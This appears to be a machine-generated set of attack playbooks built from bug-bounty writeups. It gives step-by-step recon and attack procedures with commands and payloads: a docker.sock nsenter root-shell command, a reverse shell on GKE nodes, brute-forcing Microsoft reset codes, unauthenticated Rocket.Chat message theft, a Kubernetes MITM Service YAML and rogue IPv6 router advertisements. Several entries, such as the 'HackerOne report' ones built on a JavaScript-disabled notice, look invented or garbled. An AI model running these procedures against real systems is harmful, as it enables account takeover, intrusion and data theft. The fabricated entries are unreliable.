Step 5: Observe the execution of the `startup-script` on the newly provisioned or restarted GKE Autopilot nodes.
tools_recommended: gcloud CLI: For managing GCP project metadata and creating GKE clusters.
Netcat (nc): For establishing reverse shells.
success_indicators: Successful establishment of a reverse shell connection from the GKE Autopilot node to the attacker's listener.
Execution of arbitrary commands on the GKE Autopilot node as observed by the attacker.
failure_indicators: No reverse shell connection received after cluster creation/node restart. This might indicate that the `startup-script` is not being executed, or the script itself has an error. Pivot: Verify the IAM permissions and the `gcloud` command syntax.

A 403 Forbidden error when attempting to set project metadata. This indicates insufficient IAM permissions. Pivot: Seek alternative ways to gain necessary permissions or target different vulnerabilities.

playbooks.impact: Attacker can achieve arbitrary code execution on GKE Autopilot nodes, leading to potential compromise of all workloads and secrets within the cluster. This includes reading sensitive data from other pods, escalating privileges, and exploring the attack surface of the Autopilot control plane.
playbooks.key_lesson: When targeting cloud infrastructure, always verify the existence and configuration of project-wide metadata settings that can override or bypass cluster-specific security controls, especially if you have permissions to modify them.

meta.title: Content Injection (RCE) in Yandex Browser for Android

tech_stack_fingerprints: Yandex Browser for Android (version tested v17.11.1.628)

trigger_conditions.when_to_apply: When the target application uses HTTP for certain links that are likely to be trusted by users, and a Man-in-the-Middle (MITM) attack is feasible on the target's network.
prerequisites: Attacker can perform a Man-in-the-Middle (MITM) attack on the target device's network.
The target device's DNS can be controlled or influenced by the attacker.
applicability_signals: Observing network traffic from Yandex Browser for Android that uses HTTP instead of HTTPS for internal links (e.g., Help, About, Homepage).
The target domain (e.g., help.yandex.com) is not HSTS preloaded in Chromium.
skip_if: All observed internal links within the browser use HTTPS.
The network environment prevents MITM attacks.
The target's DNS resolution cannot be influenced.

recon_steps: Step 1: Install Yandex Browser for Android (v17.11.1.628) on a test device.
Step 2: Monitor network traffic from the browser for initial connections to internal sections like Help, About, or Homepage.
Step 3: Identify any domains or URLs that use HTTP instead of HTTPS.
Step 4: Check the HSTS preload list for Chromium to confirm if the identified domains are enforced to use HTTPS.
attack_steps: Step 1: Set up a Linux host (e.g., Ubuntu 17.10) with dnsmasq and NGINX installed.
Step 2: Configure NGINX for default_type text/html and charset utf-8.
Step 3: Modify the /etc/hosts file on the Linux host to map the vulnerable domain (e.g., help.yandex.com) to the Linux host's IP address.
Step 4: Configure dnsmasq to listen on the target IP address and restart the service.
Step 5: Create a file with malicious content (e.g., 'powned') in the NGINX web root (/var/www/html).
Step 6: Configure the Android test device's network settings to use a static IP and set the DNS server to the Linux host's IP address.
Step 7: Open Yandex Browser on the Android device.
Step 8: Navigate to the vulnerable section (e.g., Settings -> Help).
Step 9: Observe if the injected content from the attacker's NGINX server is loaded within the browser's rendered page.
payloads_or_patterns: Simple HTML/JavaScript content to be served by the attacker's NGINX server. Example: 'powned'
tools_recommended: dnsmasq: For DNS redirection.
NGINX: For serving malicious content.
Burp Suite (or similar proxy): To intercept and analyze network traffic, and potentially for DNS spoofing configuration.
Wireshark: For detailed network traffic analysis.
success_indicators: The malicious content served by the attacker's NGINX server is displayed within the Yandex Browser on the Android device when accessing vulnerable sections.
Execution of JavaScript or other code injected via the MITM attack within the browser's context.
failure_indicators: The browser correctly loads the intended content via HTTPS, or a certificate warning is displayed and the user cannot proceed, indicating SSL pinning or proper HTTPS implementation.
Network traffic analysis shows no redirection to the attacker's server.
The Android device's network configuration changes do not result in the browser resolving to the attacker's server.

playbooks.impact: Remote Code Execution (RCE) within the Yandex Browser application on the Android device. This could allow an attacker to steal sensitive information, install malware, or perform other malicious actions that a web browser can execute on an Android device.
playbooks.key_lesson: Always ensure that all internal links within a browser application, especially those in trusted sections like Help or About, use HTTPS to prevent Man-in-the-Middle attacks leading to content injection and RCE.

meta.title: How I Might Have Hacked Any Microsoft Account

tech_stack_fingerprints: Password reset form with email/phone input

trigger_conditions.when_to_apply: This technique is applicable when a target Microsoft account's password reset flow does not implement sufficient rate limiting or IP-based blocking for security code validation attempts, especially when combined with concurrent requests.
prerequisites: Attacker can initiate the password reset process for a target Microsoft account.
Target account does not have advanced 2FA mechanisms that are not also vulnerable to brute force (e.g., hardware security keys).
applicability_signals: Password reset flow allows submission of a 7-digit security code.
HTTP POST requests to the code validation endpoint are observable and can be intercepted/modified.
Error responses for incorrect codes do not immediately block the account or IP address after a few attempts.
skip_if: Password reset flow requires knowledge of sensitive personal information beyond email/phone number that is not obtainable by the attacker.
WAF or security controls consistently return 403 or similar errors for brute-force attempts.
2FA mechanism is not vulnerable to brute-force (e.g., requires physical access to a device, has very short validity periods for codes).

recon_steps: Step 1: Navigate to the Microsoft account password reset page and initiate the reset for a known test account.
Step 2: Intercept the HTTP POST request sent to the security code validation endpoint using a proxy like Burp Suite.
Step 3: Analyze the request and response for the security code submission. Note any encryption or obfuscation applied to the code.
Step 4: Observe the response when submitting an incorrect code. Identify any specific error codes or messages (e.g., '1211 error code').
Step 5: Attempt to send multiple incorrect codes sequentially to identify rate limiting behavior and account/IP blocking patterns.
attack_steps: Step 1: Develop a script to enumerate all possible 7-digit security codes (0000000 to 9999999).
Step 2: Implement logic to encrypt/obfuscate the security codes as observed in the reconnaissance phase.
Step 3: Modify the script to send a large number of security code validation requests concurrently, mimicking the successful technique for Instagram account takeover.
Step 4: If an account with 2FA is targeted, repeat the process by enumerating and sending all possible 6-digit authenticator app codes first.
Step 5: Continue sending concurrent requests for both 6-digit and 7-digit codes until a successful response is received, indicating the password reset is proceeding.

Step 6: If the initial concurrent request strategy fails due to timing issues, tweak the script to ensure requests hit the server with minimal delay between them, as close to simultaneous as possible.
Step 7: Once successful response is obtained for code validation, proceed to the next step of the password reset flow to change the password.
payloads_or_patterns: Script to generate and encrypt/obfuscate all 10,000,000 combinations of 7-digit security codes.
Script to generate and encrypt/obfuscate all 1,000,000 combinations of 6-digit authenticator codes (for 2FA).
Concurrent HTTP POST requests to the security code validation endpoint.

Example request structure (conceptual, actual encryption/params will vary): POST /validateSecurityCode HTTP/1.1
Host: login.live.com
Content-Type: application/json

{"encryptedCode": "<ENCRYPTED_CODE>"}
tools_recommended: Burp Suite (for proxying, request analysis, and identifying encryption logic)
Custom Python script (using libraries like 'requests' for sending concurrent HTTP requests and 'threading' or 'asyncio' for concurrency)
success_indicators: Receiving a response that indicates the security code is valid and allowing the attacker to proceed to the password change page.
Successful redirection to a password change interface for the target account.
failure_indicators: Consistent '1211 error code' or similar indicating rate limiting without progression.
IP address being blocked, returning 403 or similar errors for all subsequent requests.
Account being permanently locked or requiring additional, unbypassable verification steps.
If concurrent requests are not timed perfectly, the server may detect the attack and block progression even with the correct code. Pivot to a more precise timing synchronization mechanism.

playbooks.impact: Full account takeover of any Microsoft account, including those with 2FA enabled, allowing attackers to access emails, documents, services, and potentially impersonate the user.
playbooks.key_lesson: Always test password reset and authentication code validation flows for insufficient rate limiting, especially when coupled with encryption or obfuscation. Employ concurrent request techniques and precise timing to bypass such controls.

meta.title: Microsoft Edge Browser For IOS - Address Bar Spoofing Vulnerability

trigger_conditions.when_to_apply: When the target is Microsoft Edge browser on iOS and the user visits a malicious webpage, the browser may render a spoofed address bar.
prerequisites: User must visit a malicious URL.
applicability_signals: Targeting Microsoft Edge Browser for iOS (version 45.9.5 mentioned).
skip_if: Browser version is not vulnerable.
Browser has specific security patches for address bar spoofing.

recon_steps: Identify if the target is using Microsoft Edge browser on iOS.
Confirm the version of the browser if possible (e.g., through user reports or OS version checks).
attack_steps: Step 1: Craft an HTML page containing a JavaScript payload.
Step 2: The JavaScript payload writes an H1 tag (e.g., 'This is not Bing').
Step 3: Immediately redirects the user's `location.href` to a legitimate-looking URL but on a non-standard port (e.g., `https://bing.com:8081`).

Step 4: Uses `setInterval` to repeatedly reload the address bar with a slightly different non-standard port (e.g., `https://bing.com:8080`) at a rapid interval (e.g., every 7 milliseconds in the writeup, but stated as every 7 seconds in the text - the POC uses 7000ms which is 7 seconds) to prevent the user from noticing the original URL.
tools_recommended: A simple web server to host the malicious HTML page.
A text editor for crafting the HTML and JavaScript payload.
success_indicators: The user's address bar in the Edge browser for iOS displays a URL that appears legitimate (e.g., `bing.com`) but is actually a spoofed or redirected address due to the non-standard port and rapid reloads.
failure_indicators: The address bar correctly displays the actual URL of the malicious page, or the spoofing attempt is immediately noticeable and the user is not tricked. Pivot: If the browser has been updated to fix this specific issue, research for other known address bar spoofing techniques for newer versions or different browsers.

playbooks.impact: Users can be tricked into believing they are on a legitimate website when they are actually on a malicious one, leading to potential phishing attacks, credential theft, or the execution of further malicious scripts.
playbooks.key_lesson: Test if browsers preserve the address bar when navigating to URLs with non-standard ports, and analyze the behavior of `setInterval` or similar functions in conjunction with `location.href` for potential address bar spoofing.

meta.title: GKE Autopilot Node Compromise via local-storage PersistentVolume

trigger_conditions.when_to_apply: This technique is applicable when a user has the ability to create pods and persistent volumes within a GKE Autopilot cluster and the 'local-storage' storage class is available and not restricted.
prerequisites: Access to a GKE Autopilot cluster
Permissions to create pods and PersistentVolumes
The 'local-storage' storage class is available on the cluster.
applicability_signals: Existence of the 'local-storage' storage class. The ability to create a PersistentVolume using this storage class.
The cluster is running in GKE Autopilot mode.
skip_if: The 'local-storage' storage class is disabled or restricted.
The user lacks the necessary permissions to create pods and PersistentVolumes.

recon_steps: Step 1: Verify GKE Autopilot cluster configuration using `gcloud container clusters list` and `kubectl config current-context`.
Step 2: Check available storage classes using `kubectl get sc` to confirm the presence of 'local-storage'.
attack_steps: Step 1: Create a dummy pod (e.g., using `alpine` image) to trigger the autoscaler to provision a new node.
Step 2: Wait for the dummy pod to reach the 'Ready' state and record the name of the node it is scheduled on.
Step 3: Create a PersistentVolume and PersistentVolumeClaim that uses the 'local-storage' storage class and mounts the `/run` directory from the identified node into the pod.
Step 4: Delete the dummy pod to allow the exploit pod to be scheduled on the same node.
Step 5: Exec into the exploit pod.

Step 6: Run the command `docker -H unix:///host/docker.sock run --rm -it --privileged --net=host --pid=host alpine nsenter --mount=/proc/1/ns/mnt -- /bin/bash` to gain a root shell on the compromised node.
payloads_or_patterns: exploit.sh script provided in the writeup
docker.yaml file provided in the writeup
Command to execute inside the exploit pod: `docker -H unix:///host/docker.sock run --rm -it --privileged --net=host --pid=host alpine nsenter --mount=/proc/1/ns/mnt -- /bin/bash`
tools_recommended: kubectl: for managing Kubernetes resources
gcloud CLI: for interacting with Google Cloud
success_indicators: Successful execution of `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` within the exploit pod, resulting in a root shell prompt on the node.
Ability to access sensitive files or execute commands directly on the GKE node.
failure_indicators: PersistentVolume creation fails due to storage class restrictions.
Pod fails to schedule or enter 'Ready' state.
Error when executing `docker -H unix:///host/docker.sock ...` command within the exploit pod, indicating the docker socket is not accessible or the `nsenter` command fails.
If the `/run` directory is not mountable or does not contain `docker.sock`.

playbooks.impact: Attacker gains full root access to the GKE node, allowing them to read all secrets in the cluster, explore the attack surface of the Autopilot control plane, and retrieve service account tokens for the default compute service account.
playbooks.key_lesson: Always scrutinize the security implications of storage classes, especially those that allow direct mounting of host system directories into pods, as they can bypass container isolation controls.

meta.title: RocketChat - Unauthenticated access to messages

trigger_conditions.when_to_apply: This technique is applicable when the target Rocket.Chat instance exposes API endpoints that are intended for authenticated users but can be invoked anonymously via `method.callAnon` without sufficient additional validation, specifically concerning the LiveChat module.
prerequisites: The target must be running a vulnerable version of Rocket.Chat.
The LiveChat feature must be enabled or accessible.
applicability_signals: Existence of API endpoints callable via `POST /api/v1/method.callAnon/<method_name>`.
Endpoints like `livechat:registerGuest` and `livechat:loadHistory` are discoverable or callable.
The server does not immediately return an authentication error for these `method.callAnon` endpoints.
skip_if: All `method.callAnon` requests are met with authentication errors (e.g., 401 or explicit auth required messages).
The specific `livechat:registerGuest` and `livechat:loadHistory` methods are not present or are properly secured.

recon_steps: Step 1: Identify Rocket.Chat instances. Look for common Rocket.Chat URLs or identify technologies using web scanners.

Step 2: Probe API endpoints using `POST /api/v1/method.callAnon/<method_name>` for common LiveChat methods like `livechat:registerGuest` and `livechat:loadHistory`. Observe responses to identify if they are accessible without authentication.
attack_steps: Step 1: Register a guest user using the `livechat:registerGuest` method via `POST /api/v1/method.callAnon/livechat:registerGuest`. Provide required parameters such as `token`, `name`, and `email`.
Step 2: Load message history from the 'GENERAL' channel using the registered guest token via `POST /api/v1/method.callAnon/livechat:loadHistory`. Provide `token` and `rid='GENERAL'`.
Step 3: (Optional for private messages) Identify user IDs from messages in public channels.

Step 4: (Optional for private messages) Use Burp Intruder or a similar tool to iterate through combinations of user IDs to construct channel IDs for private messages and query them using `livechat:loadHistory`.
payloads_or_patterns:
POST /api/v1/method.callAnon/livechat:registerGuest HTTP/1.1
Host: <TARGET_URL>:3000
Content-Type: application/json

{"message": "{\"msg\": \"method\", \"method\": \"livechat:registerGuest\", \"params\": [{\"token\": \"<session_token>\", \"name\": \"Attacker\", \"email\": \"attacker@example.com\"}], \"id\": \"123\"}"}

POST /api/v1/method.callAnon/livechat:loadHistory HTTP/1.1
Host: <TARGET_URL>:3000
Content-Type: application/json

{"message": "{\"msg\": \"method\", \"method\": \"livechat:loadHistory\", \"params\": [{\"token\": \"<session_token>\", \"rid\": \"GENERAL\"}], \"msg\": \"123\"}"}
tools_recommended: Burp Suite: To intercept and modify requests, and for using Intruder to enumerate private channel IDs.
Nuclei: To automate the detection of this vulnerability using provided templates.
success_indicators: A 200 OK HTTP status code for both `livechat:registerGuest` and `livechat:loadHistory` requests.
Response body for `livechat:loadHistory` contains message content from the 'GENERAL' channel.
Response body for `livechat:loadHistory` contains private messages if a valid private channel ID was constructed and queried.
failure_indicators: 401 Unauthorized or 403 Forbidden responses for `livechat:loadHistory` after registering a guest. This suggests that the `livechat:loadHistory` method itself has additional checks that were not bypassed.
Empty response or an error message indicating invalid parameters for `livechat:loadHistory` even with a valid guest token. This might indicate a different issue or a patched version.

playbooks.impact: An unauthenticated attacker can read messages from public channels (like 'GENERAL') and potentially private messages between users. This leads to unauthorized access to sensitive communication data.
playbooks.key_lesson: When interacting with APIs that offer both authenticated and unauthenticated endpoints (e.g., `method.call` vs. `method.callAnon`), always verify that the unauthenticated endpoints do not leak sensitive data or allow access to resources intended only for authenticated users, even if they seem to be for guest interactions.

meta.title: Big Bugs: Bitbucket Pipelines Kata Containers Build Container Escape

target_profile.technology: Kata Containers (in Bitbucket Pipelines CI/CD environment)
target_profile.required_access_level: any_authenticated_user (to run a malicious build job)

trigger_conditions.when_to_apply: When a CI/CD environment utilizes Kata Containers for build isolation and exposes volume mounts that can be written to from within the container.
prerequisites: Ability to define and run a custom build job within Bitbucket Pipelines.
applicability_signals: Use of Kata Containers for build isolation.
The build environment allows writing to supposedly read-only volume mounts.
skip_if: The build container environment strictly enforces read-only mounts and does not allow writing arbitrary data.

recon_steps: Step 1: Analyze the build job configuration within Bitbucket Pipelines to identify the containerization technology used (e.g., Kata Containers) and any mounted volumes.
attack_steps: Step 1: Craft a malicious build job that attempts to write controlled data to a known or suspected read-only volume mount within the Kata Container.
Step 2: The goal is to overwrite a critical host binary, such as the Docker binary, by exploiting the ability to write to bind-mounted volumes.
Step 3: If successful, this overwrite allows for arbitrary command execution on the host system with root privileges, leading to a container escape.
payloads_or_patterns: Write arbitrary file content to a path within a volume mount that is bind-mounted from the host.
Specifically, target the 'docker' binary on the host filesystem to overwrite it with a malicious payload.
tools_recommended: Burp Suite or similar for intercepting and modifying build job configurations if possible.
Custom scripts to define and execute build jobs with malicious payloads.
success_indicators: Successful overwrite of the host 'docker' binary.
Ability to execute arbitrary commands on the build host with root privileges.
Confirmation that a build job on a specific host can affect other tenants on the same host.
failure_indicators: Build job fails due to write permission errors on the target volume mount.
Build job completes without any observable change on the host system or ability to execute arbitrary commands.
WAF or security controls block write operations to sensitive host files.

playbooks.impact: An attacker can achieve root privileges on the build host, allowing them to interfere with any customer's pipeline builds running on the same host, leading to complete system compromise and data exfiltration from other tenants.
playbooks.key_lesson: Always verify that volume mounts within containerized CI/CD environments are strictly enforced as read-only when intended, especially when dealing with critical host binaries.

meta.title: Jira Auth Bypass bug in Google Acquisition (Apigee)

trigger_conditions.when_to_apply: When a Jira instance is accessible, especially if it's part of an acquisition (like Apigee) and uses Google OAuth for login, and specific dashboard endpoints are exposed without proper authentication.
prerequisites: Target Jira instance is accessible.
applicability_signals: Google OAuth login option available.
Access to /jira/dashboards?view%3Dpopular shows filtered data only when authenticated.
Discovery of /rest/api/2/dashboard endpoint.
skip_if: No Google OAuth login option.
WAF blocks access to Jira dashboards or API endpoints.

recon_steps: Step 1: Navigate to the Jira instance URL (e.g., <TARGET_URL>/jira/dashboards?view%3Dpopular) and observe the available login methods. Check if Google OAuth is an option.
Step 2: Attempt to log in using a personal Google account (Gmail). If successful, note the leaked dashboard names, project titles, and user profile pictures.
Step 3: Scan the target Jira instance with nuclei using Jira templates or manually probe for API endpoints, specifically looking for dashboard-related ones like /rest/api/2/dashboard.
attack_steps: Step 1: Access the Jira dashboard endpoint directly via GET request without any authentication: GET <TARGET_URL>/rest/api/2/dashboard?maxResults=100
Step 2: Analyze the response for sensitive information such as dashboard names, project titles, and user profile pictures.
tools_recommended: Burp Suite: To intercept and analyze HTTP requests and responses. Nuclei: To scan for known Jira vulnerabilities and endpoints.
success_indicators: Receiving a 200 OK response from the /rest/api/2/dashboard endpoint without any authentication.
The response body contains a JSON object listing dashboard names, project titles, or user profile picture URLs.
failure_indicators: Receiving a 401 Unauthorized or 403 Forbidden response for the /rest/api/2/dashboard endpoint. In this case, the vulnerability might be patched or not present.
The response contains no sensitive information despite a 200 OK status.

playbooks.impact: An attacker can access sensitive information including employee details within specific projects, details about new features or bugs in projects, and potentially create private dashboards if authenticated.
playbooks.key_lesson: Always test API endpoints that serve sensitive information for authentication bypass, especially if alternative authentication methods like OAuth are present.

meta.title: Any Account Takeover Through Privilege Escalation

trigger_conditions.when_to_apply: When an authenticated user can access endpoints that are intended only for administrative users, and these endpoints disclose sensitive tokens like password reset tokens.
prerequisites: Attacker must have an authenticated session with a low-privileged user.
Target application must have features or endpoints that are accessible to lower-privileged users but should only be accessible to administrators.
applicability_signals: An endpoint, when accessed by a low-privileged user, returns sensitive tokens (e.g., password reset token, salt, invitation token).
User IDs are exposed in an easily accessible manner (e.g., MD5 hash in an 'employees' section).
skip_if: All API endpoints requiring authentication return responses only for the logged-in user's data and do not leak tokens.
Endpoints intended for administrators are properly protected and return 403 or 401 errors to unprivileged users.

recon_steps: Step 1: Subscribe to target's newsletter to be informed of new features.
Step 2: Analyze newly added features or endpoints for potential misconfigurations or access control bypasses.
Step 3: Identify an endpoint that discloses sensitive tokens (password reset token, salt, invitation token).
attack_steps: Step 1: Log in with a low-privileged user account.
Step 2: Access the identified endpoint that discloses tokens, making a GET request.
Step 3: Observe the response for leaked password reset tokens for other users, particularly administrative users.
Step 4: Identify the target user ID (e.g., by observing user lists or employee sections where user IDs might be exposed as MD5 hashes).
Step 5: Navigate to the 'Forgot Password' page.
Step 6: Request a password reset for the targeted administrative user.
Step 7: Intercept the password reset request/email.
Step 8: Modify the password reset token in the request to the token obtained in Step 3 for the targeted administrative user.
Step 9: Submit the modified request with a new password for the administrative account.
Step 10: Log in with the administrative account using the newly set password.
tools_recommended: Burp Suite: For intercepting and modifying requests, especially during the password reset flow.
success_indicators: The low-privileged user receives a password reset token belonging to an administrative user.
Successfully changing the administrative user's password and logging in as the administrator.
failure_indicators: The endpoint returns an authorization error (403/401) when accessed by a low-privileged user.
The password reset token provided by the application is invalid or expired when attempted to be used.
The password reset request fails after modification, indicating token validation or other security measures are in place.

playbooks.impact: Any authenticated user can take over any other account within the same organization by exploiting a privilege escalation vulnerability that leaks password reset tokens, allowing them to reset administrative or any other user's password.
playbooks.key_lesson: Always test API endpoints intended for administrative roles with lower-privileged authenticated users, especially when new features are deployed, as access controls might be incomplete or misconfigured.

meta.title: Kubernetes man in the middle using LoadBalancer or ExternalIPs (CVE-2020-8554)

affected_components: Service object with `externalIPs` field, `LoadBalancer` type Services, `kube-proxy`
tech_stack_fingerprints: Ability to create Kubernetes Service objects

trigger_conditions.when_to_apply: When an attacker can create Kubernetes Service objects and has access to node IPs, or can influence the `externalIPs` field of a Service.
prerequisites: Attacker has sufficient privileges to create a Kubernetes Service object.
Attacker can obtain IP addresses of Kubernetes nodes.
applicability_signals: Kubernetes cluster is deployed.
The target application is exposed via a Service that uses `externalIPs` or `LoadBalancer`.
The cluster uses `kube-proxy` in IPVS mode.
skip_if: The cluster does not use `kube-proxy` in IPVS mode.
The attacker lacks the ability to create Kubernetes Service objects.

recon_steps: Step 1: Identify Kubernetes node IP addresses. This can often be done by inspecting `kubectl get nodes -o wide` output or through cloud provider interfaces.
Step 2: Check if the target application is exposed via a Kubernetes Service. Determine if the Service uses `externalIPs` or is of type `LoadBalancer`.
attack_steps: Step 1: Create a malicious Kubernetes Service object targeting the affected application. Use the `externalIPs` field to list the IP addresses of Kubernetes nodes.
Step 2: Configure the malicious Service to forward traffic to a controlled endpoint (e.g., attacker-controlled server) or to intercept and potentially modify traffic intended for the application.

Step 3: Observe network traffic to the node IPs. If the Service is correctly configured and `kube-proxy` is in IPVS mode, traffic directed to these node IPs and ports will be routed to the pods specified by the malicious Service's selector.
payloads_or_patterns:
apiVersion: v1
kind: Service
metadata:
  name: mitm-service
  namespace: <TARGET_NAMESPACE>
spec:
  selector:
    app: <TARGET_APP_LABEL>
  ports:
    - name: http
      port: 80
      targetPort: 80
    - name: https
      port: 443
      targetPort: 443
  externalIPs:
    - <NODE_1_IP>
    - <NODE_2_IP>
    - ...
    - <NODE_N_IP>
tools_recommended: kubectl: For creating and managing Kubernetes Service objects.
Network sniffer (e.g., tcpdump, Wireshark): To observe network traffic on the node IPs.
success_indicators: Network traffic directed to the node IPs on the specified ports is captured by the attacker's controlled endpoint or shows signs of interception.
The malicious Service successfully intercepts and forwards traffic to the intended application pods, or redirects it elsewhere.
Observation of traffic patterns confirming the Service is acting as a Man-in-the-Middle.
failure_indicators: No traffic is observed on the node IPs at the specified ports.
Kubernetes API returns an error when creating the Service (e.g., due to RBAC restrictions).
Traffic to node IPs does not reach the attacker's controlled endpoint, indicating `kube-proxy` is not in IPVS mode or the Service selector is incorrect.

playbooks.impact: An attacker can perform Man-in-the-Middle attacks on traffic destined for services exposed via LoadBalancer or ExternalIPs, allowing them to eavesdrop on, intercept, and potentially modify application traffic. This can lead to sensitive data exposure, session hijacking, and unauthorized actions.
playbooks.key_lesson: When exploiting Kubernetes Services, verify the `kube-proxy` mode (IPVS is vulnerable to this MiTM) and ensure any discovered node IPs used in `externalIPs` fields are strictly controlled and monitored for unauthorized access.

meta.title: HackerOne report

trigger_conditions.when_to_apply: When the HackerOne website forces JavaScript to be enabled for core functionality and an attacker can intercept or manipulate network traffic to the user's browser.
prerequisites: Attacker can perform Man-in-the-Middle attacks on the target user's network traffic.
applicability_signals: The HackerOne website displays a message indicating JavaScript is disabled and requires it to be enabled for full functionality.
skip_if: The target user has JavaScript enabled in their browser.
The HackerOne website functions without JavaScript.
The target environment has strong network security preventing MiTM attacks.

recon_steps: Step 1: Browse to HackerOne website and observe the message regarding JavaScript being disabled.
attack_steps: Step 1: Intercept user's HTTP/S traffic targeting HackerOne.com.
Step 2: If JavaScript is detected as disabled, attempt to inject malicious JavaScript into the user's browser session.
Step 3: Monitor for any sensitive information or actions performed by the user that are facilitated by JavaScript execution.
Step 4: If the user attempts to re-enable JavaScript or interact with the site in a way that requires it, attempt to exfiltrate data or perform unauthorized actions.
payloads_or_patterns: Malicious JavaScript payloads designed to be injected via MiTM (e.g., to steal session cookies, redirect to phishing pages, or capture user input).
tools_recommended: Burp Suite or OWASP ZAP (configured for MiTM and response modification)
SSLStrip (if targeting HTTPS without proper certificate validation)
success_indicators: Attacker obtains session tokens, personal identifiable information, or unauthorized access to user accounts on HackerOne.
User is redirected to a malicious page or tricked into performing an action on a fake HackerOne interface.
Observing successful execution of injected JavaScript in the user's browser console via MiTM.
failure_indicators: User is unable to connect to HackerOne, or the website displays errors unrelated to JavaScript.
No sensitive data is captured despite successful JavaScript injection.
Network security prevents the MiTM attack from succeeding.

playbooks.impact: Man-in-the-Middle attacks can lead to session hijacking, credential theft, unauthorized account access, and the compromise of sensitive information handled by the HackerOne platform.
playbooks.key_lesson: Always verify that critical website functionality does not depend on client-side JavaScript being enabled and that sensitive data transmission is properly secured against Man-in-the-Middle attacks.

meta.title: Host MITM attack via IPv6 rogue router advertisements

target_profile.technology: Container networking (Kubernetes CNI, Docker, LXD) and OS networking (WSL2)
affected_components: IPv6 network configuration within containers and hosts
tech_stack_fingerprints: Presence of IPv6 enabled on the network
Use of containerization technologies like Docker, Kubernetes, LXD

trigger_conditions.when_to_apply: This technique is applicable when the target environment uses IPv6 and allows devices on the same Layer 2 network segment to send IPv6 Router Advertisements (RAs) without validation, which is common in containerized environments that lack RA-Guard.
prerequisites: Attacker has network access to the same Layer 2 segment as the target container or host.
The target environment has IPv6 enabled.
The target environment does not have RA-Guard or equivalent protection enabled on its network interfaces.
applicability_signals: Observing IPv6 traffic or configuration within the target network.
Discovery of container orchestration platforms (Kubernetes, Docker Swarm) or container runtimes (Docker, LXD) that are not explicitly configured with RA-Guard.
WSL2 installation on Windows host.
skip_if: The network enforces RA-Guard or equivalent security measures preventing rogue RAs.
IPv6 is not enabled or used on the target network.
The attacker cannot establish network connectivity within the same L2 segment as the target.

recon_steps: Step 1: Identify if IPv6 is enabled on the target network by observing traffic or network configurations.
Step 2: Fingerprint the container networking solution in use (e.g., Kubernetes CNI, Docker, LXD).
Step 3: Determine if RA-Guard or similar mechanisms are in place (likely not if it's a default container setup).
attack_steps: Step 1: Configure an attacker-controlled container or host to send crafted IPv6 Router Advertisements (RAs) to the target network.
Step 2: In the RA, specify the attacker's IP address as the default gateway and potentially inject DNS server information pointing to an attacker-controlled server.
Step 3: Wait for the target host or container to process the rogue RA and update its IPv6 routing table and DNS configuration.
Step 4: Monitor traffic to intercept or redirect connections that attempt to use IPv6 (e.g., connections to AAAA records).
payloads_or_patterns: Crafted IPv6 Router Advertisement packets containing attacker's MAC address, attacker's IP address, and potentially attacker's DNS server information.
tools_recommended: Scapy: To craft and send custom IPv6 Router Advertisement packets.
Packet forging tools: General tools for manipulating network packets.
success_indicators: Target host/container updates its default IPv6 gateway to the attacker's IP address.
Target host/container configures attacker's IP as an IPv6 DNS server.
Traffic intended for external IPv6 destinations is observed being routed through the attacker's machine.
HTTP libraries on the target attempt to connect via IPv6 to domains with AAAA records, and the attacker intercepts these connections.
failure_indicators: Target host/container ignores the rogue RA or shows no change in its IPv6 routing/DNS configuration (indicates RA-Guard or similar protection).
No traffic is observed being rerouted through the attacker's machine after sending RAs (target may not be using IPv6 or may prioritize existing routes).

playbooks.impact: The attacker can perform a Man-in-the-Middle (MITM) attack, intercepting and potentially modifying all IPv6 traffic originating from or destined to the compromised host or container. This can lead to data exfiltration, session hijacking, or injection of malicious content.
playbooks.key_lesson: Ensure network security controls like RA-Guard are enabled on L2 interfaces, especially when deploying containerized environments, to prevent IPv6 Router Advertisement spoofing attacks.

meta.title: HackerOne report

tech_stack_fingerprints: JavaScript is required to use HackerOne

trigger_conditions.when_to_apply: This playbook is applicable when a target application forces JavaScript to be enabled for core functionality, potentially opening up client-side attack vectors.
prerequisites: Target application requires JavaScript to be enabled for user interaction.
applicability_signals: User sees a message like 'Your JavaScript is disabled. To use [Application Name], enable JavaScript in your browser and refresh this page.'
skip_if: The application functions fully without JavaScript.

recon_steps: Step 1: Access the target URL and observe if JavaScript is a mandatory requirement for full functionality.
Step 2: If JavaScript is required, note any specific error messages or prompts displayed to the user.
attack_steps: Step 1: Intercept traffic using a proxy (e.g., Burp Suite, OWASP ZAP).
Step 2: Analyze the JavaScript code loaded by the application for potential vulnerabilities such as DOM-based XSS, insecure handling of sensitive data, or logic flaws.

Step 3: Attempt to craft malicious JavaScript payloads that exploit identified vulnerabilities. This might involve injecting scripts into input fields, manipulating DOM elements, or leveraging insecure API calls.
Step 4: Test payloads by submitting them through the application's interfaces while monitoring the proxy for execution and unexpected behavior.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests/responses, and analyzing JavaScript.
OWASP ZAP: Similar to Burp Suite, offering a comprehensive set of security testing tools.
Browser Developer Tools: For inspecting DOM, network requests, and debugging JavaScript.
success_indicators: Execution of injected JavaScript (e.g., an alert box appears).
Sensitive data (like cookies or tokens) being exfiltrated to an attacker-controlled server.
Unexpected application behavior or data modification resulting from script execution.
failure_indicators: No script execution occurs, or payloads are sanitized/escaped by the application.
Application functions normally without executing injected scripts.
WAF blocks the request or response containing the payload.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, data theft, credential phishing, or unauthorized actions on behalf of the user.
playbooks.key_lesson: When JavaScript is a mandatory requirement, scrutinize client-side code for vulnerabilities like XSS, insecure data handling, and logic flaws, as these can be exploited even if server-side protections are robust.
